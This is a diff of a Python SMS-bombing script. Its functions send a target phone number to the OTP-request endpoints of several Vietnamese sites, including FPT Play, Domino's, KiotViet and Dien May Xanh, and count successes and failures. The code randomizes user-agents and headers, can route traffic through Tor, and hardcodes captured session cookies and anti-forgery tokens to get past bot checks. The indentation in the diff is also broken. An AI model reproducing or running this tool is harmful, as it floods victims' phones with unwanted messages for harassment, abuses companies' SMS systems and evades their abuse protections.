-        'origin': 'https://fptplay.vn',
-        'priority': 'u=1, i',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site',
-        'x-did': fptmatkhau_random_hex(16)
-    })
-
-    json_data = {
-        'phone': phone,
-        'country_code': 'VN',
-        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
+        cookies = {
+        'DMX_View': 'DESKTOP',
+        'DMX_Personal': '%7b%22UID%22%3a%2269da67e91306625b7e4461b2d726d53e84bdc049%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d',
+        '_gcl_au': '1.1.804133484.1690973397',
+        '_gid': 'GA1.2.1071358409.1690973397',
+        '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1690973398%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
+        '_pk_id.8.8977': 'c624660949009f11.1690973398.',
+        '_pk_ses.8.8977': '1',
+        '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXariFZ7h0kQ3U5Gs8UiAnwDyJ1ynznRhbtnOAm3G.1',
+        'cebs': '1',
+        '_ce.s': 'v~6debca02172f8c79be6e07c78168d43c57db52d6~lcw~1690973400113~vpv~0~lcw~1690973400116',
+        '_fbp': 'fb.1.1690973400267.315266557',
+        '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8Btx1b7t0ERJkQbRPSImfvKFVk5UxirK_DlUQuqJOBk33uvWuB3H3sLskY2bzhJULvBSo4FDv0B-QoElmnSUITEaiP7A5pf5u_-RRIc4q2BrvTs5VrpEf5qng-OVNYSollI8A9AmTXlvZHkimnAqouU',
+        '_ce.clock_event': '1',
+        '_ce.clock_data': '-747%2C27.72.61.29%2C1%2C15c2f6f9416d00cec8b4f729460293c0',
+        'lhc_per': 'vid|c3330ef02699a3239f3d',
+        '_gat_UA-38936689-1': '1',
+        '_ga_Y7SWKJEHCE': 'GS1.1.1690973397.1.1.1690973847.59.0.0',
+        '_ga': 'GA1.1.1906131468.1690973397',
+        'SvID': 'dmxcart2737|ZMo2n|ZMo01',
+        'cebsp_': '2',
     }
 
-    try:
-        response = requests.post(
-            'https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=0X65mEX0NBfn2pAmdMIC1g&e=1722365955&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1',
-            headers=headers_post,
-            cookies=cookies,
-            json=json_data,            
-            timeout=20,
-            verify=False,
-        )
-    except Exception as e:
-        pass
-
-def sms37(phone):
-    def call_random_user_agent():
-        agents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.98 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
-            'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
-            'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36'
-        ]
-        return random.choice(agents)
-    
-    def call_random_sec_ch_ua():
-        brands = ['Google Chrome', 'Chromium', 'Microsoft Edge', 'Not;A Brand']
-        return ', '.join([f'"{b}";v="{random.randint(90, 114)}"' for b in brands])
-    
-    def call_random_platform():
-        platforms = ['Windows', 'Macintosh', 'Android', 'Linux']
-        return f'"{random.choice(platforms)}"'
-    
-    def call_random_cookie_value(length=24):
-        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
-    
-    def call_generate_dynamic_headers():
-        return {
-            'accept': 'application/json, text/plain, */*',
-            'accept-language': 'vi',
-            'content-type': 'application/json',
-            'dmn': 'DSNKFN',
-            'dnt': '1',
-            'origin': 'https://dominos.vn',
-            'priority': 'u=1, i',
-            'referer': 'https://dominos.vn/',
-            'sec-ch-ua': call_random_sec_ch_ua(),
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': call_random_platform(),
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'secret': call_random_cookie_value(16),  # Nếu site có check, thay đổi động
-            'user-agent': call_random_user_agent(),
-        }
-    
-    def call_generate_dynamic_cookies():
-        return {
-            'session_id': random_cookie_value(24),
-            'visitor_id': random_cookie_value(24),
-        }
-
-    headers = call_generate_dynamic_headers()
-    cookies = call_generate_dynamic_cookies()
-
-    json_data = {
-        'phone_number': phone,
-        'email': 'rancellramseyis792@gmail.com',
-        'type': 0,
-
-    }
-
-    retry_strategy = Retry(
-        total=3,
-        status_forcelist=[429, 500, 502, 503, 504],
-        allowed_methods=["HEAD", "GET", "OPTIONS", "POST"],
-        backoff_factor=1
-    )
-    adapter = HTTPAdapter(max_retries=retry_strategy)
-    http = requests.Session()
-    http.mount("https://", adapter)
-    http.mount("http://", adapter)
-
-    try:
-        response = http.post(
-            'https://dominos.vn/api/v1/users/send-otp',
-            headers=headers,
-            cookies=cookies,
-            json=json_data,
-            proxies=tor_mgr.get_proxy()[0],  # nếu có Tor thì mở ra
-            timeout=(3, 10),
-            verify=False,            
-        )
-        response.raise_for_status()
-        data = response.json()
-    except requests.exceptions.RequestException as e:
-        pass
-
-def sms38(phone):
-  global thanhcong
-  global thatbai
-  def random_string(length):
-      import random
-      characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-      result = ""
-      for _ in range(length):
-          result += random.choice(characters)
-      return result
-  alo=random_string(8)
-  ten=random_string(4)
-  phone = '0' + phone
-  phone = phone.replace('00','')
-  phone12 = '+84' + phone
-  cookies = {'ads': 'www.google.com','refcode': '746','time_referer': '1689061704','kvas-uuid': '3a85af4a-1908-48f2-980d-d15395992de5','kvas-uuid-d': '1686469706132','gkvas-uuid': 'fc23dc65-4af3-4711-8198-90a46e6b0ca1','gkvas-uuid-d': '1686469706134','kv-session': '94e736d4-493e-4656-9a6a-266817374182','_hjFirstSeen': '1','_hjIncludedInSessionSample_563959': '1','_hjSession_563959': 'eyJpZCI6ImEzM2Y4MWFmLWI2YWQtNDE4Ny04N2QxLWUwM2QyZTFmNDAyMiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NzcsImluU2FtcGxlIjp0cnVlfQ==','_gid': 'GA1.2.1638977009.1686469708','_tt_enable_cookie': '1','_ttp': 'KrXyjN8UQfZPEg6udl4pOmk7Tnd','_gac_UA-158809353-1': '1.1686469710.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE','_gac_UA-64814867-1': '1.1686469711.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE','source_referer': '%5B%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%2C%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%5D','kv-session-d': '1686469712238','_hjSessionUser_563959': 'eyJpZCI6IjMwYjA2OGI0LTU4MzAtNTdkOS1iZjAwLWU0NjIxNzQ1MWZkYiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NTcsImV4aXN0aW5nIjp0cnVlfQ==','parent': '77','_ga': 'GA1.2.1398574114.1686469708','_ga_6HE3N545ZW': 'GS1.1.1686469708.1.1.1686469715.53.0.0','_fw_crm_v': '4721c26b-683b-4e2b-dbb2-62e4d7a8e93d',}
-  headers = {'authority': 'www.kiotviet.vn','accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','dnt': '1','origin': 'https://www.kiotviet.vn','referer': 'https://www.kiotviet.vn/dang-ky/?refcode=746','sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
-  data = {'phone': phone12,'code': alo,'name': 'lê van sang','email': '','zone': 'An Giang - Huyện Châu Phú','merchant': 'muabansi','username': phone,'industry': 'Thời trang','ref_code': '746','industry_id': '77','phone_input': phone,}
-  response = requests.post('https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',cookies=cookies,headers=headers,data=data, timeout=30, verify=False)
-  if 'success' in response.text:
-    thanhcong+=1
-  else:
-    thatbai+=1
-def sms39(phone):
-    global thanhcong
-    cookies = {
-        '_csrf': '973eca1396514e55d251748b39039603b1974232a85e242bfc08063f1c789d2fa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22IKtajFXbRCbbHEdh_tLbQ4g1lmiP07IS%22%3B%7D',
-        '_gcl_au': '1.1.1635282769.1685511240',
-        '_gid': 'GA1.2.147827434.1685511243',
-        '_gac_UA-53976512-2': '1.1685511243.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
-        '_gat_gtag_UA_53976512_2': '1',
-        '_dc_gtm_UA-53976512-2': '1',
-        'vid': '1468653',
-        '_gcl_aw': 'GCL.1685511244.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
-        '_ga': 'GA1.1.1662212097.1685511243',
-        'amp_6e403e': 'jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1o4p61l.1h1o4pa8v.0.2.2',
-        '_ga_D022K7SJPP': 'GS1.1.1685511244.1.1.1685511263.41.0.0',
-    }
-
-    headers = {
-        'authority': 'www.nhaphang247.com',
-        'accept': 'application/json, text/javascript, */*; q=0.01',
+        headers = {
+        'authority': 'www.dienmayxanh.com',
+        'accept': '*/*',
         'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
         'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-         'cookie': '_csrf=973eca1396514e55d251748b39039603b1974232a85e242bfc08063f1c789d2fa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22IKtajFXbRCbbHEdh_tLbQ4g1lmiP07IS%22%3B%7D; _gcl_au=1.1.1635282769.1685511240; _gid=GA1.2.147827434.1685511243; _gac_UA-53976512-2=1.1685511243.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE; _gat_gtag_UA_53976512_2=1; _dc_gtm_UA-53976512-2=1; vid=1468653; _gcl_aw=GCL.1685511244.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE; _ga=GA1.1.1662212097.1685511243; amp_6e403e=jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1o4p61l.1h1o4pa8v.0.2.2; _ga_D022K7SJPP=GS1.1.1685511244.1.1.1685511263.41.0.0',
-        'dnt': '1',
-        'origin': 'https://www.nhaphang247.com',
-        'referer': 'https://www.nhaphang247.com/huong-dan-dat-hang?utm_source=google&utm_medium=keywords&utm_campaign=adwords&gclid=CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
-        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
+        # 'cookie': 'DMX_View=DESKTOP; DMX_Personal=%7b%22UID%22%3a%2269da67e91306625b7e4461b2d726d53e84bdc049%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d; _gcl_au=1.1.804133484.1690973397; _gid=GA1.2.1071358409.1690973397; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1690973398%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.8.8977=c624660949009f11.1690973398.; _pk_ses.8.8977=1; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXariFZ7h0kQ3U5Gs8UiAnwDyJ1ynznRhbtnOAm3G.1; cebs=1; _ce.s=v~6debca02172f8c79be6e07c78168d43c57db52d6~lcw~1690973400113~vpv~0~lcw~1690973400116; _fbp=fb.1.1690973400267.315266557; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8Btx1b7t0ERJkQbRPSImfvKFVk5UxirK_DlUQuqJOBk33uvWuB3H3sLskY2bzhJULvBSo4FDv0B-QoElmnSUITEaiP7A5pf5u_-RRIc4q2BrvTs5VrpEf5qng-OVNYSollI8A9AmTXlvZHkimnAqouU; _ce.clock_event=1; _ce.clock_data=-747%2C27.72.61.29%2C1%2C15c2f6f9416d00cec8b4f729460293c0; lhc_per=vid|c3330ef02699a3239f3d; _gat_UA-38936689-1=1; _ga_Y7SWKJEHCE=GS1.1.1690973397.1.1.1690973847.59.0.0; _ga=GA1.1.1906131468.1690973397; SvID=dmxcart2737|ZMo2n|ZMo01; cebsp_=2',
+        'origin': 'https://www.dienmayxanh.com',
+        'referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
+        'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
-        'x-csrf-token': 'ZDR1dGxJa2stfwEVBg8zCTZ3FxYkDA8DO0A5Fj19DFoIWRwkXH4iOA==',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+        data = {
+        'phoneNumber': phone,
+        'isReSend': 'false',
+        'sendOTPType': '1',
+        '__RequestVerificationToken': 'CfDJ8Btx1b7t0ERJkQbRPSImfvIRzWBz3HYz5v5BqsZBR9c1E2ww7q_1JGohDXjcRDM1kdeAbuyRu9P0s0XFTPbkk43itS19oUg6iD6CroYe4kX3wq5d8C1R5pfyfCr1uXg2ZI5cgkU7CkZOa4xBIZIW_k0',
+    }
+    
+        response = requests.post(
+        'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
+        cookies=cookies,
+        headers=headers,
+        data=data,
+    )
+        hoanthanh("DIEN MAY XANH", phone)
+    except:
+        error("DIEN MAY XANH", phone)
+def tgdt(phone):
+    try:
+        cookies = {
+        'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
+        '_gcl_au': '1.1.1121422736.1720077126',
+        '_ga': 'GA1.1.304095547.1720077127',
+        '_pk_id.8.8977': 'f4065ec429abd1e2.1720077127.',
+        '_ce.clock_data': '-1077%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
+        '_fbp': 'fb.1.1720077128189.217218927440922861',
+        'TBMCookie_3209819802479625248': '350434001720103887HQtfwlkQ8p9eEkPF0VqAsJGOzLs=',
+        '___utmvm': '###########',
+        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
+        '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1720103889%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
+        '_pk_ses.8.8977': '1',
+        'SvID': 'new2688|Zoaz1|Zoaz0',
+        '_ce.irv': 'returning',
+        'cebs': '1',
+        '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5T-BVfrQtN_TjNsXHYUv3dyiopPyuZRrVU2wwbf3Jt-RZ2tfLfDJ4CYbWQhoQ0R_6DkOIHIwOIMD6pGO2uj79ZOLK3ObjH-8tmBDAn1x-pbePiOu-s5CXh2T6QLp_mMoaI',
+        'cebsp_': '2',
+        '_ga_Y7SWKJEHCE': 'GS1.1.1720103888.2.1.1720103890.58.0.0',
+        '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareEYNh1kApT7mk2UCw_ujqV2SP_oRJltHe4oZG.1',
+        '_ce.s': 'v~ee3ce10ae5283530e576b6af80819668ef23331c~lcw~1720103896357~lva~1720103889638~vpv~1~v11.cs~218102~v11.s~08b51710-3a13-11ef-bb9c-bd4200118138~v11.sla~1720103896355~gtrk.la~ly7dg4v0~lcw~1720103896476',
+    }
+
+        headers = {
+        'Accept': '*/*',
+        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'Cache-Control': 'no-cache',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'Cookie': "DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _gcl_au=1.1.1121422736.1720077126; _ga=GA1.1.304095547.1720077127; _pk_id.8.8977=f4065ec429abd1e2.1720077127.; _ce.clock_data=-1077%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; _fbp=fb.1.1720077128189.217218927440922861; TBMCookie_3209819802479625248=350434001720103887HQtfwlkQ8p9eEkPF0VqAsJGOzLs=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1720103889%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.8.8977=1; SvID=new2688|Zoaz1|Zoaz0; _ce.irv=returning; cebs=1; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8LmkDaXB2QlCm0k7EtaCd5T-BVfrQtN_TjNsXHYUv3dyiopPyuZRrVU2wwbf3Jt-RZ2tfLfDJ4CYbWQhoQ0R_6DkOIHIwOIMD6pGO2uj79ZOLK3ObjH-8tmBDAn1x-pbePiOu-s5CXh2T6QLp_mMoaI; cebsp_=2; _ga_Y7SWKJEHCE=GS1.1.1720103888.2.1.1720103890.58.0.0; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareEYNh1kApT7mk2UCw_ujqV2SP_oRJltHe4oZG.1; _ce.s=v~ee3ce10ae5283530e576b6af80819668ef23331c~lcw~1720103896357~lva~1720103889638~vpv~1~v11.cs~218102~v11.s~08b51710-3a13-11ef-bb9c-bd4200118138~v11.sla~1720103896355~gtrk.la~ly7dg4v0~lcw~1720103896476",
+        'Origin': 'https://www.dienmayxanh.com',
+        'Pragma': 'no-cache',
+        'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+        'X-Requested-With': 'XMLHttpRequest',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+        data = {
+        'phoneNumber': phone,
+        'isReSend': 'false',
+        'sendOTPType': '1',
+        '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5Twguyex9_cgh9XeukD7bUARFjQSniZ-oK2sROjdYE3ySLrvJztUU-tZn-ZBnL8wqLJjlGTji6qBtWGJDVYPGVt0U3RgoB0Q2Grd4i24dkz4TUIRjXBHguoShv3oZjAt2s',
+    }
+
+        response = requests.post(
+        'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
+        cookies=cookies,
+        headers=headers,
+        data=data,
+    )
+        hoanthanh("THE GIOI DI DONG", phone)
+    except:
+        error("THE GIOI DI DONG", phone)
+def concung(phone):
+    try:
+        cookies = {
+        'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
+        '_pk_id.7.8f7e': '26368263202a729d.1690741327.',
+        '_fbp': 'fb.1.1690741326923.344831016',
+        '_tt_enable_cookie': '1',
+        '_ttp': '4ISzilNrZxHb4rxPiS6GakGBcBl',
+        'TBMCookie_3209819802479625248': '256783001720103762EqkLWbY41pHbZLmofZhYIMXUU7I=',
+        '___utmvm': '###########',
+        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
+        '_gcl_au': '1.1.584652992.1720103764',
+        'SvID': 'beline2685|ZoazW|ZoazV',
+        '_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1720103765%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
+        '_pk_ses.7.8f7e': '1',
+        '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBMCyLI0SVSaDSpDzEt7c6CGCXKntCHv_9RxrtvtDK2AJgoOhTMujYstZ1JQlXX1KSIsK5Xrm8FKNYtGX-fIJ5AA650hlmDqcMk3EgiLr_dsuk-ZGFU0r-5zKj768mbpHEs',
+        '_ga': 'GA1.2.1745564613.1690741327',
+        '_gid': 'GA1.2.530012217.1720103766',
+        '_gat': '1',
+        '_ce.irv': 'returning',
+        'cebs': '1',
+        '_ga_TZK5WPYMMS': 'GS1.2.1720103766.6.0.1720103766.60.0.0',
+        '_ga_TLRZMSX5ME': 'GS1.1.1720103764.33.1.1720103766.58.0.0',
+        '__zi': '3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJd3RMg_oH21tPCzsfyvP67TancQxqdKiTt3KvD0.1',
+        '_ce.clock_data': '-186%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
+        'cebsp_': '1',
